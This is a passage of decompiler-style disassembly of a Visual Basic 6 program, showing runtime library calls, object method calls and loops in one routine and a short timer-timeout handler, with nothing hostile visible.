007F7F6C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F7F71: add esp, 0000000Ch
007F7F74: lea eax, var_44
007F7F77: push eax
007F7F78: lea eax, var_40
007F7F7B: push eax
007F7F7C: lea eax, var_3C
007F7F7F: push eax
007F7F80: push 00000003h
007F7F82: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7F87: add esp, 00000010h
007F7F8A: lea eax, var_74
007F7F8D: push eax
007F7F8E: lea eax, var_64
007F7F91: push eax
007F7F92: lea eax, var_54
007F7F95: push eax
007F7F96: push 00000003h
007F7F98: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F7F9D: add esp, 00000010h
007F7FA0: mov var_04, 00000014h
007F7FA7: lea eax, var_30
007F7FAA: mov var_80, eax
007F7FAD: mov var_00000088, 0000400Ch
007F7FB7: cmp [008F2010h], 00000000h
007F7FBE: jnz 7F7FDBh
007F7FC0: push 008F2010h
007F7FC5: push 00433984h
007F7FCA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7FCF: mov var_00000198, 008F2010h
007F7FD9: jmp 7F7FE5h
007F7FDB: mov var_00000198, 008F2010h
007F7FE5: push 00000000h
007F7FE7: push 00000014h
007F7FE9: push 00440E58h
007F7FEE: push 00000010h
007F7FF0: pop eax
007F7FF1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F7FF6: lea esi, var_00000088
007F7FFC: mov edi, esp
007F7FFE: movsd 
007F7FFF: movsd 
007F8000: movsd 
007F8001: movsd 
007F8002: push 00000001h
007F8004: push 00000000h
007F8006: push 00440E48h
007F800B: push 00000000h
007F800D: push 00000018h
007F800F: mov eax, var_00000198
007F8015: mov eax, [eax]
007F8017: mov ecx, var_00000198
007F801D: mov ecx, [ecx]
007F801F: mov ecx, [ecx]
007F8021: push eax
007F8022: call [ecx+00000550h]
007F8028: push eax
007F8029: lea eax, var_3C
007F802C: push eax
007F802D: call 00410A84h ; Set (object)
007F8032: push eax
007F8033: lea eax, var_54
007F8036: push eax
007F8037: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F803C: add esp, 00000010h
007F803F: push eax
007F8040: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F8045: push eax
007F8046: lea eax, var_40
007F8049: push eax
007F804A: call 00410A84h ; Set (object)
007F804F: push eax
007F8050: lea eax, var_64
007F8053: push eax
007F8054: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F8059: add esp, 00000020h
007F805C: push eax
007F805D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F8062: push eax
007F8063: lea eax, var_44
007F8066: push eax
007F8067: call 00410A84h ; Set (object)
007F806C: push eax
007F806D: lea eax, var_74
007F8070: push eax
007F8071: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F8076: add esp, 00000010h
007F8079: cmp [008F2410h], 00000000h
007F8080: jnz 7F809Dh
007F8082: push 008F2410h
007F8087: push 00440E38h
007F808C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F8091: mov var_0000019C, 008F2410h
007F809B: jmp 7F80A7h
007F809D: mov var_0000019C, 008F2410h
007F80A7: push var_0000019C
007F80AD: lea eax, var_74
007F80B0: push eax
007F80B1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F80B6: mov edx, eax
007F80B8: lea ecx, var_34
007F80BB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F80C0: push eax
007F80C1: call 007BCE98h
007F80C6: sub ax, FFFFh
007F80CA: neg ax
007F80CD: sbb eax, eax
007F80CF: inc eax
007F80D0: neg eax
007F80D2: mov var_000000B8, ax
007F80D9: lea ecx, var_34
007F80DC: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F80E1: lea eax, var_44
007F80E4: push eax
007F80E5: lea eax, var_40
007F80E8: push eax
007F80E9: lea eax, var_3C
007F80EC: push eax
007F80ED: push 00000003h
007F80EF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F80F4: add esp, 00000010h
007F80F7: lea eax, var_74
007F80FA: push eax
007F80FB: lea eax, var_64
007F80FE: push eax
007F80FF: lea eax, var_54
007F8102: push eax
007F8103: push 00000003h
007F8105: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F810A: add esp, 00000010h
007F810D: movsx eax, word ptr var_000000B8
007F8114: test eax, eax
007F8116: jz 007F81DBh
007F811C: mov var_04, 00000015h
007F8123: cmp [008F2480h], 00000000h
007F812A: jle 7F8146h
007F812C: mov var_04, 00000016h
007F8133: mov eax, [8F2480h]
007F8138: sub eax, 00000001h
007F813B: jo 007F8756h
007F8141: mov [8F2480h], eax
007F8146: mov var_04, 00000018h
007F814D: cmp [008F2410h], 00000000h
007F8154: jnz 7F8171h
007F8156: push 008F2410h
007F815B: push 00440E38h
007F8160: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F8165: mov var_000001A0, 008F2410h
007F816F: jmp 7F817Bh
007F8171: mov var_000001A0, 008F2410h
007F817B: mov eax, var_000001A0
007F8181: mov eax, [eax]
007F8183: mov var_000000B8, eax
007F8189: lea eax, var_30
007F818C: push eax
007F818D: mov eax, var_000000B8
007F8193: mov eax, [eax]
007F8195: push var_000000B8
007F819B: call [eax+28h]
007F819E: fclex 
007F81A0: mov var_000000BC, eax
007F81A6: cmp var_000000BC, 00000000h
007F81AD: jnl 7F81CFh
007F81AF: push 00000028h
007F81B1: push 00440E28h
007F81B6: push var_000000B8
007F81BC: push var_000000BC
007F81C2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F81C7: mov var_000001A4, eax
007F81CD: jmp 7F81D6h
007F81CF: and var_000001A4, 00000000h
007F81D6: jmp 007F7FA0h
007F81DB: mov var_04, 0000001Ch
007F81E2: lea eax, var_00000120
007F81E8: push eax
007F81E9: lea eax, var_00000110
007F81EF: push eax
007F81F0: lea eax, var_30
007F81F3: push eax
007F81F4: call 00410A36h ; Next
007F81F9: mov var_00000160, eax
007F81FF: cmp var_00000160, 00000000h
007F8206: jnz 007F7C9Ah
007F820C: jmp 007F861Bh
007F8211: mov var_04, 0000001Dh
007F8218: mov eax, [ebp+08h]
007F821B: mov eax, [eax]
007F821D: push [ebp+08h]
007F8220: call [eax+0000037Ch]
007F8226: push eax
007F8227: lea eax, var_3C
007F822A: push eax
007F822B: call 00410A84h ; Set (object)
007F8230: mov var_000000B8, eax
007F8236: lea eax, var_40
007F8239: push eax
007F823A: push 00000002h
007F823C: mov eax, var_000000B8
007F8242: mov eax, [eax]
007F8244: push var_000000B8
007F824A: call [eax+40h]
007F824D: fclex 
007F824F: mov var_000000BC, eax
007F8255: cmp var_000000BC, 00000000h
007F825C: jnl 7F827Eh
007F825E: push 00000040h
007F8260: push 00440DE8h
007F8265: push var_000000B8
007F826B: push var_000000BC
007F8271: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8276: mov var_000001A8, eax
007F827C: jmp 7F8285h
007F827E: and var_000001A8, 00000000h
007F8285: push 00000000h
007F8287: push 00000000h
007F8289: push var_40
007F828C: lea eax, var_54
007F828F: push eax
007F8290: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F8295: add esp, 00000010h
007F8298: push eax
007F8299: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F829E: sub ax, FFFFh
007F82A2: neg ax
007F82A5: sbb eax, eax
007F82A7: inc eax
007F82A8: neg eax
007F82AA: mov var_000000C0, ax
007F82B1: lea eax, var_40
007F82B4: push eax
007F82B5: lea eax, var_3C
007F82B8: push eax
007F82B9: push 00000002h
007F82BB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F82C0: add esp, 0000000Ch
007F82C3: lea ecx, var_54
007F82C6: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F82CB: movsx eax, word ptr var_000000C0
007F82D2: test eax, eax
007F82D4: jz 007F861Bh
007F82DA: mov var_04, 0000001Eh
007F82E1: call 007A879Eh
007F82E6: mov var_04, 00000020h
007F82ED: mov var_80, 00000001h
007F82F4: mov var_00000088, 00000002h
007F82FE: cmp [008F2410h], 00000000h
007F8305: jnz 7F8322h
007F8307: push 008F2410h
007F830C: push 00440E38h
007F8311: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F8316: mov var_000001AC, 008F2410h
007F8320: jmp 7F832Ch
007F8322: mov var_000001AC, 008F2410h
007F832C: mov eax, var_000001AC
007F8332: mov eax, [eax]
007F8334: mov var_000000B8, eax
007F833A: lea eax, var_000000AC
007F8340: push eax
007F8341: mov eax, var_000000B8
007F8347: mov eax, [eax]
007F8349: push var_000000B8
007F834F: call [eax+24h]
007F8352: fclex 
007F8354: mov var_000000BC, eax
007F835A: cmp var_000000BC, 00000000h
007F8361: jnl 7F8383h
007F8363: push 00000024h
007F8365: push 00440E28h
007F836A: push var_000000B8
007F8370: push var_000000BC
007F8376: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F837B: mov var_000001B0, eax
007F8381: jmp 7F838Ah
007F8383: and var_000001B0, 00000000h
007F838A: mov eax, var_000000AC
007F8390: mov var_00000090, eax
007F8396: mov var_00000098, 00000003h
007F83A0: mov var_000000A0, 00000001h
007F83AA: mov var_000000A8, 00000002h
007F83B4: lea eax, var_00000088
007F83BA: push eax
007F83BB: lea eax, var_00000098
007F83C1: push eax
007F83C2: lea eax, var_000000A8
007F83C8: push eax
007F83C9: lea eax, var_00000140
007F83CF: push eax
007F83D0: lea eax, var_00000130
007F83D6: push eax
007F83D7: lea eax, var_30
007F83DA: push eax
007F83DB: call 00410A3Ch ; For
007F83E0: mov var_00000164, eax
007F83E6: jmp 007F860Eh
007F83EB: mov var_04, 00000021h
007F83F2: cmp [008F2410h], 00000000h
007F83F9: jnz 7F8416h
007F83FB: push 008F2410h
007F8400: push 00440E38h
007F8405: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F840A: mov var_000001B4, 008F2410h
007F8414: jmp 7F8420h
007F8416: mov var_000001B4, 008F2410h
007F8420: mov eax, var_000001B4
007F8426: mov eax, [eax]
007F8428: mov var_000000B8, eax
007F842E: lea eax, var_54
007F8431: push eax
007F8432: lea eax, var_30
007F8435: push eax
007F8436: mov eax, var_000000B8
007F843C: mov eax, [eax]
007F843E: push var_000000B8
007F8444: call [eax+1Ch]
007F8447: fclex 
007F8449: mov var_000000BC, eax
007F844F: cmp var_000000BC, 00000000h
007F8456: jnl 7F8478h
007F8458: push 0000001Ch
007F845A: push 00440E28h
007F845F: push var_000000B8
007F8465: push var_000000BC
007F846B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8470: mov var_000001B8, eax
007F8476: jmp 7F847Fh
007F8478: and var_000001B8, 00000000h
007F847F: lea eax, var_54
007F8482: push eax
007F8483: lea eax, var_34
007F8486: push eax
007F8487: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
007F848C: push eax
007F848D: call 004109DCh ; Val(arg_1)
007F8492: fstp real8 ptr var_000000B4
007F8498: push 00000000h
007F849A: push 00000001h
007F849C: push 00000001h
007F849E: push 00000000h
007F84A0: lea eax, var_78
007F84A3: push eax
007F84A4: push 00000010h
007F84A6: push 00000880h
007F84AB: call 00410946h ; ReDim
007F84B0: add esp, 0000001Ch
007F84B3: mov var_80, 00442930h
007F84BA: mov var_00000088, 00000008h
007F84C4: lea esi, var_00000088
007F84CA: push 00000000h
007F84CC: push var_78
007F84CF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F84D4: mov ecx, eax
007F84D6: mov edx, esi
007F84D8: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F84DD: mov var_00000090, 00442BFCh
007F84E7: mov var_00000098, 00000008h
007F84F1: lea esi, var_00000098
007F84F7: push 00000001h
007F84F9: push var_78
007F84FC: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F8501: mov ecx, eax
007F8503: mov edx, esi
007F8505: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F850A: mov edx, 0043D464h ; x7
007F850F: lea ecx, var_38
007F8512: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8517: lea eax, var_78
007F851A: push eax
007F851B: lea eax, var_38
007F851E: push eax
007F851F: fld real8 ptr var_000000B4
007F8525: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F852A: push eax
007F852B: call 007A6910h
007F8530: lea eax, var_78
007F8533: push eax
007F8534: push 00000000h
007F8536: call 00410934h ; Erase
007F853B: lea eax, var_38
007F853E: push eax
007F853F: lea eax, var_34
007F8542: push eax
007F8543: push 00000002h
007F8545: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F854A: add esp, 0000000Ch
007F854D: lea ecx, var_54
007F8550: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F8555: mov var_04, 00000022h
007F855C: cmp [008F2410h], 00000000h
007F8563: jnz 7F8580h
007F8565: push 008F2410h
007F856A: push 00440E38h
007F856F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F8574: mov var_000001BC, 008F2410h
007F857E: jmp 7F858Ah
007F8580: mov var_000001BC, 008F2410h
007F858A: mov eax, var_000001BC
007F8590: mov eax, [eax]
007F8592: mov var_000000B8, eax
007F8598: lea eax, var_30
007F859B: push eax
007F859C: mov eax, var_000000B8
007F85A2: mov eax, [eax]
007F85A4: push var_000000B8
007F85AA: call [eax+28h]
007F85AD: fclex 
007F85AF: mov var_000000BC, eax
007F85B5: cmp var_000000BC, 00000000h
007F85BC: jnl 7F85DEh
007F85BE: push 00000028h
007F85C0: push 00440E28h
007F85C5: push var_000000B8
007F85CB: push var_000000BC
007F85D1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F85D6: mov var_000001C0, eax
007F85DC: jmp 7F85E5h
007F85DE: and var_000001C0, 00000000h
007F85E5: jmp 007F82E6h
007F85EA: mov var_04, 00000024h
007F85F1: lea eax, var_00000140
007F85F7: push eax
007F85F8: lea eax, var_00000130
007F85FE: push eax
007F85FF: lea eax, var_30
007F8602: push eax
007F8603: call 00410A36h ; Next
007F8608: mov var_00000164, eax
007F860E: cmp var_00000164, 00000000h
007F8615: jnz 007F83EBh
007F861B: mov var_04, 00000026h
007F8622: mov eax, [ebp+08h]
007F8625: mov eax, [eax]
007F8627: push [ebp+08h]
007F862A: call [eax+00000314h]
007F8630: push eax
007F8631: lea eax, var_3C
007F8634: push eax
007F8635: call 00410A84h ; Set (object)
007F863A: mov var_000000B8, eax
007F8640: push 00000000h
007F8642: mov eax, var_000000B8
007F8648: mov eax, [eax]
007F864A: push var_000000B8
007F8650: call [eax+5Ch]
007F8653: fclex 
007F8655: mov var_000000BC, eax
007F865B: cmp var_000000BC, 00000000h
007F8662: jnl 7F8684h
007F8664: push 0000005Ch
007F8666: push 00447A20h
007F866B: push var_000000B8
007F8671: push var_000000BC
007F8677: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F867C: mov var_000001C4, eax
007F8682: jmp 7F868Bh
007F8684: and var_000001C4, 00000000h
007F868B: lea ecx, var_3C
007F868E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F8693: mov var_10, 00000000h
007F869A: wait 
007F869B: push 007F8737h
007F86A0: jmp 7F86ECh
007F86A2: lea eax, var_38
007F86A5: push eax
007F86A6: lea eax, var_34
007F86A9: push eax
007F86AA: push 00000002h
007F86AC: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F86B1: add esp, 0000000Ch
007F86B4: lea eax, var_44
007F86B7: push eax
007F86B8: lea eax, var_40
007F86BB: push eax
007F86BC: lea eax, var_3C
007F86BF: push eax
007F86C0: push 00000003h
007F86C2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F86C7: add esp, 00000010h
007F86CA: lea eax, var_74
007F86CD: push eax
007F86CE: lea eax, var_64
007F86D1: push eax
007F86D2: lea eax, var_54
007F86D5: push eax
007F86D6: push 00000003h
007F86D8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F86DD: add esp, 00000010h
007F86E0: lea eax, var_78
007F86E3: push eax
007F86E4: push 00000000h
007F86E6: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
007F86EB: ret 
End Sub

Private sub tmrTimeout__7F933E
007F933E: push ebp
007F933F: mov ebp, esp
007F9341: sub esp, 0000000Ch
007F9344: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007F9349: mov eax, fs:[00h]
007F934F: push eax
007F9350: mov fs:[00000000h], esp
007F9357: push 00000018h
007F9359: pop eax
007F935A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F935F: push ebx
007F9360: push esi
007F9361: push edi
007F9362: mov var_0C, esp
007F9365: mov var_08, 0040A0E0h
007F936C: mov eax, [ebp+08h]
007F936F: and eax, 00000001h
007F9372: mov var_04, eax
007F9375: mov eax, [ebp+08h]
007F9378: and al, FEh
007F937A: mov [ebp+08h], eax
007F937D: mov eax, [ebp+08h]
007F9380: mov eax, [eax]
007F9382: push [ebp+08h]
007F9385: call [eax+04h]
007F9388: mov eax, [ebp+08h]
007F938B: mov eax, [eax]
007F938D: push [ebp+08h]
007F9390: call [eax+00000310h]
007F9396: push eax
007F9397: lea eax, var_18
007F939A: push eax
007F939B: call 00410A84h ; Set (object)
007F93A0: mov var_1C, eax
007F93A3: push 00000000h
007F93A5: mov eax, var_1C
007F93A8: mov eax, [eax]
007F93AA: push var_1C
007F93AD: call [eax+5Ch]
007F93B0: fclex 
007F93B2: mov var_20, eax
007F93B5: cmp var_20, 00000000h
007F93B9: jnl 7F93D2h
007F93BB: push 0000005Ch
007F93BD: push 00447A20h
007F93C2: push var_1C
007F93C5: push var_20
007F93C8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F93CD: mov var_2C, eax
007F93D0: jmp 7F93D6h
007F93D2: and var_2C, 00000000h
007F93D6: lea ecx, var_18
007F93D9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F93DE: mov var_04, 00000000h
007F93E5: push 007F93F6h
007F93EA: jmp 7F93F5h
007F93EC: lea ecx, var_18
007F93EF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007F93F4: ret 
End Sub

